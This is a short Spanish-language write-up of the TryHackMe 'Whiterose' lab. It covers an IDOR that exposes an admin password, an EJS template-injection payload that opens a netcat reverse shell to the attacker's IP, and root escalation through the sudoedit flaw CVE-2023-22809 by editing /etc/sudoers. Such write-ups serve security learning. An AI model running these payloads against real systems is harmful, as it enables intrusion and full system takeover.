# Whiterose - TryHackMe
**IP:** 10.10.255.140

## Enumeración
Agregamos los vhosts a `/etc/hosts` (`cyprusbank.thm`, `admin.cyprusbank.thm`).

## Foothold - IDOR + credenciales
El panel de mensajes es vulnerable a IDOR:
```
http://admin.cyprusbank.thm/messages/?c=0
```
Iterando los mensajes aparece la contraseña de un usuario admin (Gayle Bev):
```
'p~]P@5!6;rs558:q'
```

## RCE - SSTI (EJS)
El formulario de *settings* inyecta en la plantilla EJS vía `outputFunctionName`:
```
name=x&password=x&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc <mi_ip> 7777 -e sh ');s
```
Shell como el usuario web.

## Escalada - sudoedit (CVE-2023-22809)
```bash
sudo -l   # (ALL) sudoedit ...
```
El bug de `sudoedit` permite editar archivos fuera de la lista permitida abusando de `SUDO_EDITOR`:
```bash
export SUDO_EDITOR='nano -- /etc/sudoers'
sudoedit /etc/... 
```
Nos damos permisos en `/etc/sudoers` → `sudo su` → root.
